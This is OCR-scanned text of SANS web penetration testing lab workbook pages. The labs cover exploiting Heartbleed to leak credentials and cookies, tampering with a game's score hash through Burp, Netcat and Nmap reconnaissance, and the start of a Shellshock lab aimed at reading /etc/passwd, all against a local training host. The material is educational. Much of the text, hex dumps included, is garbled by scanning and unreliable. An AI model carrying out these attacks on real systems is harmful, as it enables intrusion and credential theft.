00a0: 32 00 GE 00 eo 00 rn 00 0a 00 0c 00 1a 00 09 00 2 .••..••.••••.•• 
00b0: 0A 08 16 00 17 00 88 08 06 00 87 00 14 00 15 80 
.••..•..••••.••• 
.•.....•.... 3.2 . 
. . • . EJ) .•.•. /, .. 
A ••• ,, •••••••• ,• 
'---' 
'-J 
'-J 
'-J 
\._./ 
___, 
___, 
'---' 
'---' 
'-J 
\._./ 
'---' 
'---' 
\._./ 
'-J 
'-J 
\._./ 
'-J 
'---' 
'---' 
'-J 
Scroll down and see what was retrieved from the vulnerable OpenSSL server's RAM. 
'-J 
'-J 
The username and password will not be there yet. 
You should see a cookie value: What is it? 
\._./ 
'-J 
'-J 
Warning: If you receive an error, make sure to run from a location that allows you to write files (e.g. 
/home/ student). 
Note: The username and password will not be present after the first form submission; they will typically be 
there after the second form submission (coming up in the next step). 
'-J 
___, 
'---' 
'-J 
'-J 
Note: Type "q" to quit less. 
\._./ 
'-J 
'-J 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.4: Testing and Exploiting Heartbleed 
6 
'---' 
'-' 
'-' 
Enter a Different Username and Password 
Go back to Firefox and enter a different username and password. 
Then press "Submit" again. 
Return to the terminal window and rerun the previous command. 
$.heartbleed.py heart.bleed 
less 
l 
Scroll through the output, and look for the first username and password entered. 
Note: If you still don't see the username and password, enter a third set of credentials and run 
heartbleed. py again. 
As noted previously: RAM is volatile and is in a different state for each student. If you don't see the 
username and password, then run heartbleed. py again. Occasionally additional rounds are required, 
depending on the state of your RAM. 
Note: If you receive an error, make sure to run from a location that allows you to write files (e.g. 
,-._ 
/home/ student). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.4: Testing and Exploiting Heartbleed 
7 
Terminal 
- + lit 
,;:_ 
Received heartbeat response: 
8088: 02 40 00 08 83 02 53 43 58 98 90 ilB 72 8B BC 0C 
8818: BC 28 92 AS 48 97 CF SD 39 84 CC 16 fJA 85 03 98 
0020: 9F 11 04 33 04 DE 00 ea 66 ca 14 ce aA ca 22 ca 
8038: 21 00 39 00 38 80 as 00 87 ca aF ca 85 ea 35 ea 
0840: 84 ca 1:z ca ea ca 1c ca 1a 00 16 00 13 ca ao ca 
0as8: 03 08 aA ce 13 ca 09 ca lF ca 1e aa 33 ea 32 ea 
aaea: 9A ea 99 ea 45 00 44 ca GE ca 84 aa ZF ea 96 ae 
0010: 41 ce 11 ca 01 ca sc ca 02 0a 05 aa 84 oa 1s es 
aaaa: 12 ea 09 00 14 00 11 00 0a 00 00 00 03 ea FF 01 
0090: 00 ea 49 00 as 00 84 e3 ea 01 02 ae aA ea 34 00 
aaas: 32 00 ae 00 00 ae 19 00 ee 00 ac 00 18 ea 89 ea 
eebe: GA 00 16 00 11 ea 08 00 0s 00 01 ea 14 00 15 ae 
00c0: 04 00 05 00 12 00 13 00 01 08 02 00 03 00 0F 00 
08d8: 10 08 11 08 23 00 00 08 8F 00 01 Bl 6C 2C 61 78 
..•. # •••••.• lrap 
80e0: 78 6C 69 63 61 74 69 6F 6E 2f 78 60 6C 3B 71 30 plication/xml:q= 
00f0: 30 2E 39 2C 2A 2F 2A 3B 71 30 30 2E 38 00 0A 41 0.9,.*/*;q=0.S.,A 
8100: 63 63 65 70 74 20 4C 61 6E 67 75 61 67 65 3A 28 ccept-language: 
0110: 65 6E 20 55 53 2C 65 6E 36 71 3D 30 2E 35 00 0A en-US,en;q=a.s .. 
tll20: 41 63 63 65 70 74 20 45 6E 63 6F 64 69 6E 67 3A Accept-Encoding: 
0130: 20 67 7A 69 70 2c 20 64 65 66 6C 61 74 65 00 0A. 
gzip, deflate,. 
0148: 52 65 66 65 72 65 72 3A 20 68 74 74 78 73 3A 2F Referer: https:./ 
8150: 2F 68 65 61 72 74 2E 62 6C 65 65 64 2F 68 65 61 
/heart.bleed/hea 
8168: 72 74 62 6C 65 65 64 2E 68 74 60 6C 3F 75 73 65 
rtbleed.html?use 
8178: 72 6E 61 6D 65 30 66 69 72 74 75 73 65 72 6E 61 
rname=firtuserna 
8188: 6D 65 26 78 61 73 73 77 6F Tl 64 30 66 69 72 73 me&password=firs 
8198: 74 78 61 73 73 77 6F 72 64 ao BA 43 6F 6F 68 69 tpassword .. cooki 
.@ .... SC[ ... r ... 
• + ..... H ... ., .9- •• ., •.••• 
~W~3-,,,,,., 
*" .. f..,. *II!~ 
0 
« 
! .9.8 ......•.. 5. 
. . . . • . 
. .. 3. 2 . 
• E.O. 
./ .•• 
A'I, .. , ....... 
lo' .... ,., "'.," •."' 
.. ~I ........ ., ... ..,.,.,4. 
2 ••••••••••••••• 
Note that our first username ("firstusername") and password ("firstpassword") are revealed in 
RAM, along with the cookie set by the web page ("Answer = 
1 42 1 "). 
The heartbleed. py script also creates a dump file called "dump. bin" by default; it contains a binary 
copy of all dumped memory contents. You may view the printable strings in this file with this command: 
I $ strings dump.bin 
.J 
The command assumes "dump. bin" is in the current directory. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1 .4: Testing and Exploiting Heartbleed 
'-" 
'--" 
'--" 
'-" 
'-" 
'--" 
'-' 
'-" 
'-" 
'-" 
'-" 
'--" 
'-" 
'-" 
'-" 
'-" 
'---" 
'-" 
'-" 
'-" 
'---" 
'-" 
'-" 
'-- 
'-" 
'-"' 
"--- 
'-" 
'-" 
'--" 
'-" 
'-" 
'-" 
'-" 
'--" 
'-" 
8 
'-" 
'-" 
'-" 
!credits 
Thanks to Andrew Kennedy (@Llfescape) for his POC web page that we based the Heart (bleed) of 
Gold server on. 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 1.4: Testing and Exploiting Heartbleed 
9 
In the Security542 VM: Open Burp and then open Firefox. 
In Firefox: Go to the proxy selector, and choose Burp. 
In Firefox: Go to the Exercises Toolbar -> Snake. 
,---._ 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
1 
'-" 
Play Snake. Press the space bar to start the game, and use the arrow keys to change direction. Try to hit 
...__, 
the red blocks with your snake. Once you understand how the game works, start a new game and score 10 
points. Enter a name with '10' on the end (so you can later match the score to other variables in Burp). 
Play again, and score 20 points. Enter a name with '20' on the end (such as 'Eric20'). Repeat the process 
and score 30 points, entering a name with '30' on the end. 
Next, go to Burp. Find the POSTs to /snake/enterHighscore.php 
Burp Intruder Repeater Window Help 
sequencer 
Decoder 
comparer 
Extender 
Options 
Alerts 
Proxy 
Spider 
Scanner 
__ hf!p://www.sec542.or, 
1Host 
;Method 
URL 
http://WWW .sec542 .org 
http;/fwww.sec542.org 
http://www.sec542.org 
http :f/www .secsa 2 .orq 
http://www.sec54 2 .org 
http:/fwww.sec542.org 
/snake/ .. 
/snake/enterHighscore.php 
/snake/enterHighscore.php 
/snake/enterHighscore.php 
/snake/highscores.txt?l 486 ... 
Jsnake/highscores.txt:?1486 .. , 
/sn.akefhighscores.txt:?1486 ... 
o·J···· · ,·,· ; ·· ·, 
· ·····' •· 
· .... L ... ·,·· ,·:·,,•·•·, ~-.~;'~;··: · ,,;·•·:·;·;·;·:·•,·:;,o,,• ,s•\g.\ 
!>- 
JReque~lR~sponse ) 
f,J:T 
POST 
POST 
POST 
GET 
GET 
! 
j ~1,J Headers T Hex ] 
GET /snake/ HTTP/1.l 
Host: w..'W.sec542.org 
User-Agent: Mozi Ua/5.0 (XU; ubuntu; Linux i6S6; rv:51.0) 
Gecko/20100101 Fi re fox/SL o 
I > } ----- 
::erm 
Double-click on the first POST. 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
L!. 
c matcnes 
'--' 
'--' 
'-._..,, 
'--' 
'--' 
'-" 
'-' 
'--' 
'-' 
'-' 
'-._..,, 
'--' 
'-' 
'--' 
'--' 
'-' 
'-' 
'-' 
'-._..,, 
'--' 
'--' 
'-._..,, 
'--' 
'--' 
'-._..,, 
'-' 
'-' 
'-' 
'-' 
'-" 
'-._..,, 
'--' 
'-' 
'-" 
'-' 
2 
\.J 
'-' 
---..... 
Sequencer 
Decoder 
Comparer 
Extender 
Options 
Proxy 
Scanner 
Filter: 
POST /snal<e/enterH1ghscore.php KITP/L l 
Ht>st: ......- • secS42. or;;i 
USar-A;ient: Mozilla/5.0 (XU; i.buntu; Unux i600; rv:51.0) 
Gecko,'20100101 Ftrefox/51.0 
I Accept: te,t/l'itllll, . .;pplication/xhtml+:,;mt, appliuti onttml;q"'1, a, •/•;q,,o. e 
Accept-Lanqvage: M·IJS,en;q=0.5 
Accept·Encoding: gzip, deflate 
ccnnecri on : close 
Content-Type: apptication/x•,...,.r· form-url.,ncoded 
Content-Length: 4653 
gaoo"'li5Flevel0\<2E';a"""&te:<tMC~leve;l0¾2£t&xtM£:&scoreTextField=%51'lew;lO'< 
:?EscoreT extF1 ~ld&statusTextFi elddl.Sf'l,we l~tBtusT\l:<tFie ld&highscor<fs=¾ 
SFt~\:'qlfPOEh 19h$cote!S&%24versiorl:::1.J4X%2fi-l1%2C2¾-?Cl02\~-startGame~8ty 
pe,.2CFunctian~ai n~5Stype..,20f'un~tion~rep tayMain.,,,SBtype%2Cfilr.cti<ln 
'\SD&gameOver=%SStyp~2C,-unct1on'l...<se&placeFeod=%SStype"o2CFunction'>SO&-,-;nterH 
ighac<>red,59typ~nct1on%Sf¼g<>t!..oadedPecordingNwnoorHighscorePos~y 
pe•,zcnmctiori.._'lD&loadHi ghscnn,s,,,.SBtype'¾ZOFunc t, on•6.'½1.oadf\!/cordi ng ""5Sty 
l!. 
GJGJ1 ~/ p;~;;;:;r;;;;;,-~H, ~~~~~~· ~~~r1 ~ ~r~~~~,~~~;ches 
The Request body has all the values required to beat Snake, but they are encoded. The Params tab has the 
same information in an easier-to-understand form. Click the Params tab. Notice that the first two columns 
are squeezed together (showing ' .. ' as values): 
f 
l.......f 
. l Response J 
I Raw r .~.arams I Headers r Hex ] 
# 
POST request to /snake/enterHighscore .pnp 
"I .. j Value 
.... _levelO.game 
_levelO .textMC 
_levelO.scoreTextField 
levelo .statusrextslelc 
_levelO.highscores 
LNX 11,2,202,548 
[type Function] 
Move those two columns over to reveal the values shown, and scroll to the bottom. 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
3 
s I Headers I Hex 
POST request to /snake/enterHighscore .php 
! Type 
j Name 
! Vi;,l~e 
. 
i Boey~·rumQueue 
!• a 
! Body 
tocdceunter 
1 
I
' Body 
snakeBlockCounter 
71 
Body 
currentDirection 
O 
Body 
snakeEraseCounter 65 
Body 
score 
10 
Body 
scorehash 
1437 
Body 
lastRec 
37 
Body 
ticks 
71 
'---' 
'---' 
'---' 
'---' 
'-' 
'-' 
'-' 
'-' 
'-' 
Changing the score is not enough to win the challenge; scorehash must also be changed. Part of the 
challenge is deducing the connection between score and scorehash. 
Note that score= 10 and scorehash = 1437. Inspect the values for the scores of 20 and 30. 
Snake's server-side logic is quirky, here are a few notes: 
'-' 
'-' 
'-' 
'--" 
'---' 
'---' 
• 
Any score higher than the current high score will show as +1 on the scoreboard. For example, if the 
current score is 2501, and you score 3000, your new leaderboard score will be 2502. 
• 
You can resubmit the same score of 3000, and your new score will be 2503. 
• 
Why? Ask the developer. We agree this is odd, but it makes it easy to create high scores. 
The next section contains spoilers for completing the challenge. 
'-' 
'--" 
'--" 
'-' 
'-' 
'-' 
'-' 
'-' 
'--" 
'-' 
'-' 
·'-.J 
'-' 
'-' 
'-' 
'-' 
'--" 
'-' 
'-' 
'--' 
'-" 
'-" 
'-./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
4 
'-' 
'-./ 
I Completing the Snake Challenge 
Here is the pattern: 
• 
score: 10,scorehash: 1437 
• 
score:20,scorehash: 1737 
• 
score:30,scorehash:2237 
The next challenge is deducing the algorithm. You can use Wolfram Alpha's sequence search if you have 
Internet access (see section at the end). Many students notice the "37" at the end of all scorehashes and 
see "1337" (leetspeak for 'leet', where the 1 is an I, the 3's are e's and the 7 is at). 
The algorithm is (score *score)+ 1337. We can now predict a future scorehash based on a score. 
Round numbers are easier to use, so we'll calculate a score of 5000 (remember that any score higher than 
the current high score will show as +1 on the scoreboard): 
• 
(5000 * 5000) 
+ 1337 == 25001337 
In Firefox: Play Snake and score any amount of points. Do not enter a high score yet. 
" 
Go to Burp's Proxy-> Intercept tab and press the Intercept button: 
Burp Intruder Repeater Window Help 
Target Pr~ Spider scanner 
Intruder 
Repeater 
Sequencer 
D 
lntet<:~pt . HTTP hlstery 
WebSockets history 
Options 
Intercept will now be on: 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
5 
Go back to Firefox and enter a name. 
IWIN!! 
Once you press enter: Burp Intercept will automatically pop up. 
E:<t<!t>d¢t 
Scanner 
! 
J!Ccir·me-ntth.i-3 
HOst: ,.,,...~.secs.4:2 .. (trg 
!JSAAr~Agent: 14;zilLa/S.O txn: thuntu; Linux i6S6; nnSLO) Gecko/20100101 FH'e:fot/51.0 
Accept: toxt/html,.app lication/xhtml<+-xmt~ app l ic:ation/ xmt;q~. 9~ */*-; q.¢,O. 8 
Aceept,Language: tn~us,en;qtt!:O.S 
Accopt-Eflco</,s4: ,µip, d•Hata 
Cl'J~t:ticm: cl.oss 
Content~ Type:: ap-p li <:at.ion/-,;.. ·~>"fht~ +orm-er-Leoceded 
CGf'it@nt•Le.ng1.h: 3211 
Click the Para ms tab and move the first two columns (showing' .. ' as values) apart. Scroll to the bottom. 
Change score to 5000 and scorehash to 25001337. Then press the Intercept button, turning it back off. 
Decoder 
Comparer 
Spider 
WebSockets history I optiom;; 
lZJ Requestto http://www.sec542.org:80 [127.0.0.l] 
Forward 
j [ 
Drop 
l 
Headers I Hex 
POST request to /snake/enterHighscore.php 
Type 
I Name 
! Value 
ll''l;.Jl~-.,;,,,'V~~f~----'"~----------------1 
Body 
snakeBlockCounter 
44 
3 
38 
Body 
Body 
Body 
curreraclrectton 
snakeeresecounter 
score 
sooo 
I $C;ijrehash 
• ~5'001337 
lastRec 
31 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
\.....,I
'--' 
'--' 
'-.J 
'--' 
'--' 
'-" 
.. __ , 
s...,· 
-._,, 
'-...,• 
'---' 
\.....,I 
\.....,I 
'-" 
'--' 
'---' 
.'--' 
\.....,I 
\.....,I 
'-" 
'-.J 
'-" 
'-.J 
'-" 
\.....,I 
'--' 
\,_; 
'-../ 
'-" 
'--' 
v 
'-.J 
\,_; 
\.....,I 
'-" 
'-" 
'--' 
, ...... , 
6 
'-" 
'--' 
'-..., · 
Go back to Firefox (you may need to reload the page). You win! 
r--- 
Final Step 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
bWAPP Ill 
SANS Sec::nrity 542 - Web Pen Test.in~ 
OOleb Authentication - Digest 
l 
Rat Proxy 
~§
V~7e~b~ 
.. ~A~u~th~
• 
.~en~t~i~c~a~ti~JJ~11~-=~F~o~rm~
· 
.~
.s~
· ==ll 
Zap 
~~~~~~~~~~~=:::::J1--- 
i.b====='-'~H~e;;;fil~
· 
·~t~b~le~e~d~========~i i Manage Proxies 
1€} £'._references 
542.1 
l!!I!'_P Reqll.est / Response 
· 
.. / 
VVeb Authentication - Basie 
System Proxy 
Ensure No Proxy is set when complete. 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
7 
\,_./ 
'-._/ 
I Wolfram ~Alpha S~9uence Search 
Wolfram Alpha sequence search can discover the scorehash algorithm. If you have Internet connectivity, 
go to https://www.wolframalpha.com. 
The sequence search needs 4 values, so score 40 points, and you'll see scorehash is 2937. Enter the 
following search in Wolfram Alpha "1437,1737,2237,2937, ... " Be sure to include the" ... " at the end. 
https://www.wolframalpha.com/input/?i=1437,+1737,+2237,+2937, ... 
Wolfram Alpha notices the "1337", and the algorithm can be simplified as: (score* score)+ 1337 
SEC542 - © 2018 Seth Misenar and Eric Conrad Lab 1.5: Snake Challenge Walkthrough 
\,_./ 
'---" 
'--' 
\,_./ 
'--' 
..._,, 
\,_./ 
'--' 
'-.../ 
'---" 
'---" 
'--' 
'---" 
'---" 
'---" 
'-.../ 
\_J 
'-.../ 
'---" 
"----' 
'-._/ 
'-.../ 
'---" 
'--' 
'-.../ 
'--' 
'--' 
'-.../ 
'-.../ 
'--' 
'---" 
"----' 
'---" 
'--' 
''-..,/ 
'--' 
8 
\_J 
'-.../ 
'--' 
-- ~ 
X 
X 
- 
- 
~_-» 
- :: 
= 
Exe r::c}se 2.1- .:;. G:q tl:z e~i'BilJ-Senttte n lri.f o nm a ti on 
-- 
~ 
- 
X 
~c.._- 
- 
<=:,_~ -~ 
,......._ 
I Objectives 
• 
Perform basic server information gathering 
• 
Use Netcat to craft simple HTTP requests 
• 
Leverage Nmap NSE scripts to gain additional info 
,-... 
ILabSetup 
Log in to Security542 VM: 
Username: student 
Password: Securi ty542 
Open a terminal by clicking the terminal icon on the upper panel or double-clicking the desktop icon. 
I Challenge: No Hints 
,,----, 
Perform the following: 
• 
Use Netcat to craft a HTTP version 1.0 HEAD request to http://www. sec542. org 
• 
Use Netcat to craft a HTTP version 1.0 HEAD request to https: / /www. sec542. org (notice https 
rather than http) 
• 
Perform an Nmap version scan of www. sec542. org 
• 
Use an Nmap NSE script to investigate the contents of the robots. txt file at the root of 
http://www.sec542.org 
• 
Locate and explore other NSE scripts in the student VM, paying particular attention to web-relevant 
ones 
"' 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.1: Gathering Server Information 
1 
lstep-by~Steplnstructions 
Running Netcat 
Open a terminal and use Netcat to connect to www. sec542. org 
...__, 
...__, 
I $ nc www.sec542.org 80 
'-..., 
'-..., 
'-..., 
Note that the cursor simply drops down to the next line without returning any data. At this point, Netcat 
has created a connection to port 80 on the local machine and is waiting for you to enter data to send. 
Manually send an HTIP HEAD request. Type: 
l H~lu) / HTTP /1. 0 
Then press <Enter> twice. 
This should elicit a response from the HTIP server running locally on port 80. Examine the response for 
information regarding the server version. 
'-.J 
'-..., 
'-..., 
'-..., 
'-..., 
'-....I 
'-J 
'-..., 
'-J 
'-..., 
,.. 
Te:rmioal 
- + X 
[-]$ nc WW\'1.sec542.org 80 
HEAD / HTTP/ 1. 8 
HTTP/1.1 200 OK 
Date: Mon, 12 Feb 2018 15:42:49 GMT 
Server: Apache/2.4.7 (Ubuntu} 
Last-Modified: Sat, 23 Dec 2817 20:47:53 GMT 
ETag: 
11975-561088c0dda61
11 
Accept-Rang:es: bytes 
Content-Length: 2421 
Vary: Accept-Encoding 
Connection: close 
Content-Type: text/html 
r--1$ I 
'-.., 
'-..., 
'-..., 
'-.,I 
'-.,I 
'-' 
. ...__, 
'-.,I 
'-..., 
.____.,, 
'-.J 
'-..., 
'-J 
The "Server" HTIP response header, while able to be forged, offers a good starting point for consideration. 
'-..../ 
'-.J 
...__, 
...__, 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.1: Gathering Server Information 
2 
'-.J 
...__, 
'-.,I 
Run Netcat to connect to port 443 on www.sec542.org. Type the command: 
Manually send another HTTP HEAD request. Type: 
HEAD 
~ 
Then press <Enter> twice. 
-)$ nc www.sec542.org 443 
EAD / HTTP/1.0 
/1. 1 400 Bad Request 
!Date: Wed, 17 Jan 2018 15:57:55 GMT 
:server: Apache/2 .4. 7 (Ubuntu) 
:Content-Length: 437 
;Connection: close 
:content-Type: text/html; charset=iso-8859 · 1 
;<!DOCTYPE HTML PUBLIC "·//IETF//DTD HTML 2.0//EN"> 
!<htm l><head> 
;<title>480 Bad Request</title> 
i</head><body> 
khl>Bad Request</hl> 
:<p>Your browser sent a request that this server could not understand .<br /> 
!Reason: You're speaking plain HTIP to an SSL-enabled server port.<br /> 
· Instead use the HTIPS scheme to access this URL, ptease.ebr /> 
</p> 
<hr> 
!<address>Apache/2.4. 7 (Ubuntu) Server at Iocalhost Port 443</address> 
'</body></html:> 
:r-1 $ I 
Note: This results in the "HTTP/1.14OO Bad Request" error because Netcat did not negotiate ssl. However, 
it still divulges the server version information. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.1: Gathering Server Information 
3 
Running Nmap 
'--" 
'--" 
Run Nmap with the service version detection option. Type the following command: 
'--" 
'-' 
$ nmap 
sV www.sec542.org 
'--' 
. '--' 
The (- sV) switch performs service version detection for ports that are deemed open by Nmap. This results 
in much more traffic being sent, but gives much better fidelity than just guessing a service version based 
upon port number. 
Output should look similar to the following: 
- + 
-'-7''."C- .. c.c"'=:,- Ta~~~~·~------~~-, 
www.sec542.org 
· 
Starting Nmap 7.49 ( https://nmap.org l at 2917-82-04 11:33 PST 
Nmap scan report for www.s.ec542.org (127.8.0.Il 
Host is up {8.S08828s latency). 
rONS record for 127 .0.0. l: localhost 
Not shown: 993 closed ports 
PORT 
STATE SERVICE 
VERSION 
22/tcp 
open 
ssh 
OpenSSH 6.6.lpl Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
53/tcp 
open domain 
se/tcp 
open 
http 
Apache httpd 2.4.7 {(Ubuntul) 
443/tcp open 
sst/ssl 
Apache httpd (SSL-only model 
631/tcp open Ipp 
CUPS l. 7 
3306/tcp open mysql 
MySOL 5.5.54-0ubuntu0.14.84.l 
5432/tcp open postgresql PostgreSQL OB 9.3.14 · 9.3.15 or 9.4.6 • 9.4.S 
Service Into: OS: Linux; CPE: cpe:/o:linux:Unux_kernel 
Service detection performed. Please report any incorrect resuus at https:l/nmap.org/submit/ 
Nmap done: 1 IP address (l host up) scanned in 12.36 seconds 
H$JJ 
Note: Nmap will take several seconds to run. If you're questioning whether it is actually running, press the 
<spacebar> to display details about the scan. The version scan first finds open ports, and then connects 
to the service in an attempt to identify the name and version of the application running on that particular 
port. 
'-' 
'--" 
'-' 
'--' 
'--' 
'--' 
'---' 
'--' 
'--' 
'---' 
'--' 
'---' 
'---' 
~ 
'-' 
'-' 
'--' 
~ 
'-' 
'-' 
Run Nmap with a script that identifies data found in the robots. txt file. Type the following command: 
~ 
'--' 
$ nmap --script=http-robots.txt www.sec542.org 
'-' 
~ 
Change to the /usr /local/ share/nmap/ scripts directory and review some of the scripts. The 
http-robots. txt. nse is one of many interesting ones for application pen testers. The robots.txt file 
tells search engines like Google and Bing not to index listed files and directories. Those entries can be 
interesting! 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.1: Gathering Server Information 
4 
~ 
'--' 
'--' 
:. 
~ - _ 
- 
X 
- 
- 
· 
: ·-::- 
- - 
~~e ruifer2. 2 :~-s 11 ellsh o ufi 
- : · ~ 
- ~-- 
' 
- 
~ 
» 
~-~ 
~ ----- 
- 
- - 
- 
- 
~ 
- - 
- 
-:::: 
~ -= 
< 
~ 
I Objectives 
• 
• 
• 
• 
• 
Lab Goal: Let's exploit the Shellshock Vulnerability! 
Gain familiarity with Burp Suite 
Learn to intercept and manipulate requests with Burp 
Use a proxy switching tool to point browser at an interception proxy 
Exploit Shellshock vulnerabilities via crafted HTTP requests 
!Challenge: No Hints 
Target resource is: http://www. sec542. org/ cgi-bin/netstat. cgi 
Perform the following: 
~ 
Burp Suite 
• 
Using Burp, intercept a request from Firefox to load http://www.sec542.org/cgi-bin/netstat.cgi 
• 
In Burp, change the User-Agent string of the request made from Firefox to exploit Shellshock and 
display the contents of/ etc/passwd in the browser 
• 
In Burp, now alter the User-Agent string of a request to determine the userid under which we are 
running 
curl 
• 
Leverage cURL to exploit the same Shellshock vulnerability from the command line in order to: 
o 
Display the contents of /etc/passwd 
o 
Determine the userid under which we are running 
o 
Determine the kernel version of the student VM 
Note: Source code for the cgi can be found here: /usr /lib/ cgi-bin/netstat. cgi 
Step-by-step instructions begin on the next page. 
~ 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
1 
jstep-by-Step Instructions 
In Firefox, go to Exercises-> Shellshock Netstat.cgi 
.J Mutiffidae 
''~'="·=·~~~;,; 
llll.l Advanced username Ha.rvi 
llll.lBASE 
8 BeEf Control Panel 
llll.l Blind SQUnjection 
e Drupa! 
·~ Heanbleed 
II HTTP Request I Response 
f MutiHidae 
• phpbb 
;A phpMyAdmin 
a.snake 
netstat. cgi is a simple CGI (Common Gateway Interface) file that displays the output from the 
nets tat -nl t command. This page exists to check the local network connections of a web server, 
without requiring logging in locally to run the netstat command. 
r. http;,- 
.... netstat.cgi 
,/ 
-- + 
Ii{~+ "' ""''W\v.sec542.orgli.:g' 
,,,,,,,,__..,..,__...,.....,. 
_ 
T 
• 
- - - 
Executing: netstat -nlt 
Active Internet connections (only servers) 
Proto Recv-Q Seoo-Q Local Address 
tcp 
a 
a, 121.e.e.1;3§6 
tcp 
e 
a, 192.168.l.S:5'3 
tcp 
e 
e 121.8.8.1:53 
tcp 
a 
e e.e.e.e:22 
tcp 
e 
a 121.e.e.1:631 
tcp 
e 
e 121.e.e.1:5432 
tcp 
& 
e 121.e.e.1:953 
tcp 
e 
a 121.a.e.1:443 
tcp 
e 
a, 127.3.3.3:443 
tcp6 
8 
0 : : : 00 
tcp6 
e 
a : : :53 
tcp6 
e 
e :::22 
tcp6 
a 
e : : l:631 
tcp6 
e 
a ::t:953 
foreign Address 
8J.UU~:"' 
8.8.8.8:* 
0.8.0.8:* 
8.8.8.8:* 
a.a.cu~:* 
e.e.8.S:* 
8.8.8.8:* 
e.e.e.8:* 
8,f:L8.8:* 
:: :* 
: : :* 
! * ,;;:t' 
! * ,;;;f 
State 
LIS"TEM 
LlS"TEM 
LlS"TEM 
LlS"TEM 
LISTEM 
LlS"TEM 
LlSTB'.J 
LISTEN 
LISTEN 
LlS"TEM 
LIS"TEM 
LlS"TEM 
LlSTEfi 
LlS"TEM 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
\......; 
'-- 
'-' 
\......; 
'-..,, 
'-' 
'-..,, 
'-..,, 
'-,I 
'-' 
..._,, 
'-" 
'-" 
'-' 
'-" 
\......; 
'-" 
'-..,, 
'-- 
\.__/ 
'-..,· 
'-" 
'-' 
'-,I 
'-" 
'-,I 
'-" 
..._,, 
'-.../ 
'-' 
'-..,, 
'-../ 
'-' 
'-,I 
'-' 
'--,I 
2 
'-' 
'-' 
'-.../ 
View the cgi-bin Source Code 
We can't view the actual cgi-bin code via the browser because the browser sees only the output. 
View the code locally by typing the following into Terminal: 
$ cat /:usr/lib/cgi-bin/netstat.cgi 
Results should look like: 
X 
Fie 
Edit View 
c=-,.c,_ --~Cscc,,,~-"'"""-''"''"'"''''~-•""--''-£'''"'°'=----"""'"=--~,,_. 
(-]$ cat /usr/\ib/cgi-bin/netstat.cgi 
!/usr/local/bin/bashsh 
echo "Content-type: text/html" 
echo 
echo ·Executing: netstat -nlt" 
echo 
echo 0<pre>" 
/bin/netstat -nlt 
lecho "</pre>u 
]$ 
The code is simple: 
#!/usr/local/bin/bashsh 
echo 11Content-type: text/html11 
echo 
echo "Executing: netstat -nlt11 
echo 
echo 11<pre>11 
/bin/netstat -nlt 
echo "</pre>" 
There's not much that appears obviously vulnerable: No forms, no POST, no SQL, no options, and such. 
Note: The system-installed version of bash ( /bin/bash) is patched; /usr /local/bin/bashsh is a 
version of bash that is vulnerable to Shellshock. It's called bashsh (BAsh SHell SHock) to keep it safely out 
of the way of normal system operation. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
3 
Running Burp 
Launch Burp by clicking the Burp icon in the upper panel: 
'-' 
'-.J 
'-' 
'-.J 
'-.J 
'-' 
'-' 
'-.J 
'-' 
'-' 
'-' 
Wait for Burp to launch. 
'-' 
'-' 
Run one instance of Burp only. Multiple instances of Burp are running if you see the warning below. 
'-' 
Note: If you only have one instance running, you should not expect to see the popup below. 
'-' 
'-..., 
'-' 
Your temporary directory contains the following folders which appear to have been previously generated by Burp, Would you llke to delete these? 
i 
Note: you should not delete these files if another instance of Burp ls current~, runninq. 
wed Jan 17 08:26:35 PST 2018 Jtmp/burp7644161613305329404:tmp 
Wed Jan 17 06:26:35 PST 2018 /tmp/bucp1458118343269D81906,tmp 
Wed Jan 17 08: 26:35 PST 2018 Jtmp/burp3975632956637 475085,tmp 
~(~j 
'-' 
'-' 
'-..,/ 
'-' 
'-' 
In this case, choose Leave and then close the newest Burp instance, leaving the original. When in doubt, 
close all Burp instances and start over. 
Warning: Burp must be listening on port 8082, and the Burp instance that generates the preceding error 
cannot bind to port 8082 because it is in use by another instance. 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-.J 
'-..J 
'-..,/ 
'-.J 
'-' 
'-' 
'-..J 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
4 
·J 
-._./ 
'-../ 
Then choose Burp in the Firefox Proxy Selector menu: 
mi SANS 542 - Web l'en Te ... 
542 .. 1 
I 
1© freferences 
Set Burp Intercept 
Go to Burp-> Proxy-> Intercept and select Intercept is on: 
Burp will now intercept all requests. 
WebSockets histar'.!,,' 
Options 
Then go to Firefox and reload the Shellshock Netstat.cgi page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.2: Shellshock 
5 
The Intercepted Request 
'-.../ 
'-../ 
The Burp intercept window shows the request has been temporarily stopped. Burp enables us to change 
any displayed values or even add in additional values. 
Our first task is to change the User-Agent string in such a way as to exploit a Shellshock vulnerability and 
